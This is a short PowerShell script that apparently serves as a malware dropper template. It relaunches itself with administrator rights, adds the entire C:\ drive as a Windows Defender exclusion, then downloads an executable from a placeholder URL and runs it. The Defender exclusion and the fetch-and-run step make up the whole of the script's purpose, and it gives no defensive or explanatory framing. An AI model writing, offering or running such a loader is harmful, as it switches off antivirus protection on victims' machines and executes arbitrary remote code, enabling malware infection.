$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$windowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)
$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator

if (-not $windowsPrincipal.IsInRole($adminRole)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    $arguments = $MyInvocation.BoundParameters.GetEnumerator() | ForEach-Object { "-$($_.Key) '$($_.Value)'" } | Out-String
    $arguments = $arguments.Trim()
    Start-Process powershell.exe -Verb runAs -ArgumentList "-File `"$scriptPath`" $arguments"
    exit
}
       

Add-MpPreference -ExclusionPath "C:\"


$url = "exe direct URI"


$destination = "C:\your exe name"


if (Test-Path $destination) {
    Remove-Item $destination -Force
}


Invoke-WebRequest -Uri $url -OutFile $destination


if ($?) {

    Start-Process -FilePath $destination
} else {

    exit $LASTEXITCODE
}
